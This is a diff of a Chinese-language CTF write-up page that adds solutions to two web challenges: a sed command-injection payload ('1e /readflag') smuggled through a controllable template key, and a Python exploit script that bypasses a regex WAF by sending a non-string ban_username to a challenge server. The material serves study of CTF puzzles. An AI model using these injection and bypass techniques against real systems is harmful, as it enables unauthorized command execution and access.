@@ -29,7 +29,7 @@
 <meta property="og:image" content="http://example.com/img/nctfwaitwhat1.png">
 <meta property="og:image" content="http://example.com/img/nctfwaiatwhat2.png">
 <meta property="article:published_time" content="2023-12-31T15:08:50.000Z">
-<meta property="article:modified_time" content="2023-12-27T14:00:15.208Z">
+<meta property="article:modified_time" content="2023-12-28T09:19:54.854Z">
 <meta property="article:author" content="notbad3">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary_large_image">
@@ -202,7 +202,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          13k 字
+          15k 字
         
       </span>
     
@@ -213,7 +213,7 @@
         
         
         
-          110 分钟
+          127 分钟
         
       </span>
     
@@ -277,17 +277,22 @@
 <p>注意这里，执行了<code>shell</code>脚本文件：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;METHOD=<span class="hljs-subst">$method</span>&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你的method太复杂了！&quot;</span>);<br>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;KEY=<span class="hljs-subst">$key</span>&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你的key太复杂了！&quot;</span>);<br>    <span class="hljs-variable">$status_code</span> = -<span class="hljs-number">1</span>;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;sh generate.sh&quot;</span>);<br></code></pre></td></tr></table></figure>
 
-<p>下载<code>generate.sh</code>文件：</p>
+<p>下载<code>generate.sh</code>文件，这东西大致意思就是对模板内容进行了替换：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br><br>set -e<br><br>NEW_FILENAME=$(tr -dc a-z0-9 &lt;/dev/urandom | head -c 16)<br>cp template.php &quot;/tmp/$NEW_FILENAME&quot;<br>cd /tmp<br><br>sed -i &quot;s/KEY/$KEY/g&quot; &quot;$NEW_FILENAME&quot;<br>sed -i &quot;s/METHOD/$METHOD/g&quot; &quot;$NEW_FILENAME&quot;<br><br>realpath &quot;$NEW_FILENAME&quot;<br></code></pre></td></tr></table></figure>
 
 <p><code>templete.php</code>:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_METHOD</span>[<span class="hljs-string">&quot;KEY&quot;</span>]);<br><br></code></pre></td></tr></table></figure>
 
+<p>这题看着<code>wp</code>做的：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">/g;1e /readflag;s//<br>即:<br>sed -i &quot;s/KEY//g;1e /readflag;s///g&quot; &quot;$NEW_FILENAME&quot;<br></code></pre></td></tr></table></figure>
 
+<p><code>s/KEY//g</code>这东西是个替换操作，将<code>$NEW_FILENAME</code>这个文件里所有的<code>KEY</code>都替换成空。<code>;</code>用来分隔多个<code>sed</code>命令。<code>e</code>这东西可以用来执行系统命令(比如<code>/readflag</code>)，前面加个<code>1</code>表示将执行结果插入到文件第一行。后面又用了一个<code>;</code>分割并将所有空字符串替换成空字符串。</p>
+<p><code>KEY</code>和<code>METHOD</code>都可控，随便改一个就行。</p>
+<p>最后注意这里：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;key&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;114&quot;</span> <span class="hljs-attr">pattern</span>=<span class="hljs-string">&quot;[A-Za-z0-9]+&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;你的key太复杂了！简单点！o.O&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/g;1e /</span>readflag;s<span class="hljs-regexp">//</span><br></code></pre></td></tr></table></figure>
-
-<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="Wait-What"><a href="#Wait-What" class="headerlink" title="Wait What?"></a>Wait What?</h3><blockquote>
+<p>简单前端验证，抓包修改就行。</p>
+<h3 id="Wait-What"><a href="#Wait-What" class="headerlink" title="Wait What?"></a>Wait What?</h3><blockquote>
 <p>题目描述：这怎么可能呢？</p>
 </blockquote>
 <p><img src="/img/nctfwaitwhat1.png" srcset="/img/loading.gif" lazyload alt="nctfwaitwhat1"></p>
@@ -336,7 +341,19 @@
 <p>但这个<code>try catch</code>告诉我们：如果传入的数据导致报错，就可以跳过正则表达式的更新：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeRegExp</span>(<span class="hljs-params">string</span>) &#123;<br>    <span class="hljs-keyword">return</span> string.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[.*+?^$&#123;&#125;()|[\]\\]/g</span>, <span class="hljs-string">&#x27;\\$&amp;&#x27;</span>);<br>&#125;<br><span class="hljs-comment">//这函数的作用就是将需要转义的字符串替换为斜杠+其本身</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">build_banned_users_regex</span>(<span class="hljs-params"></span>) &#123;<br>	<span class="hljs-keyword">let</span> regex_string = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> username <span class="hljs-keyword">of</span> banned_users) &#123;<br>        regex_string += <span class="hljs-string">&quot;^&quot;</span> + escapeRegExp(username) + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-string">&quot;|&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p>但注意，<code>replace</code>是针对字符串对象的一个方法，所以我们可以通过传入<code>string</code>参数为非字符串类型来抛出异常，从而绕过<code>regex</code>更新。</p>
+<p>注意，<code>replace</code>是针对字符串对象的一个方法，所以我们可以通过传入<code>string</code>参数为非字符串类型来抛出异常，从而绕过<code>regex</code>更新。</p>
+<p><code>/ban_user</code>这个路由没对用户输入进行任何过滤、转义等。理论上我们可以构造任意输入：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/ban_user&#x27;</span>, requireLogin, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span><br>    <span class="hljs-keyword">let</span> ban_username = req.<span class="hljs-property">body</span>.<span class="hljs-property">ban_username</span><br>    <span class="hljs-keyword">if</span>(!ban_username)&#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ban_username不能为空&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">if</span>(username === ban_username)&#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;不能封禁自己&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> name <span class="hljs-keyword">of</span> banned_users)&#123;<br>        <span class="hljs-keyword">if</span> (name === ban_username) &#123;<br>            res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户已经被封禁&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        &#125;<br>    &#125;<br>    banned_users.<span class="hljs-title function_">push</span>(ban_username)<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;封禁成功！&quot;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure>
+
+<p>现在解题思路就清晰了：</p>
+<ul>
+<li>访问 &#x2F;api&#x2F;ban_user 路由，构造传入参数 ban_username 为 对象、数组 等其他数据类型 </li>
+<li>访问 &#x2F;api&#x2F;flag ，正则匹配成功，使得 regex 的 lastIndex 移至 “admin”.length 以后 </li>
+<li>访问 &#x2F;api&#x2F;flag，正则匹配失败，成功绕过正则 waf，正则 waf 返回 false，获得 flag</li>
+</ul>
+<p><code>exp</code>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>remote_addr=<span class="hljs-string">&quot;http://117.50.175.234:9001&quot;</span><br><br>rs = requests.Session()<br><br>resp = rs.post(remote_addr+<span class="hljs-string">&quot;/api/register&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(resp.text)<br><br>resp = rs.post(remote_addr+<span class="hljs-string">&quot;/api/ban_user&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;ban_username&quot;</span>:&#123;<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">1</span>&#125;&#125;)<br><span class="hljs-built_in">print</span>(resp.text)<br><br>resp = rs.post(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(resp.text)<br>resp = rs.post(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(resp.text)<br></code></pre></td></tr></table></figure>
+
 
                 
               </div>
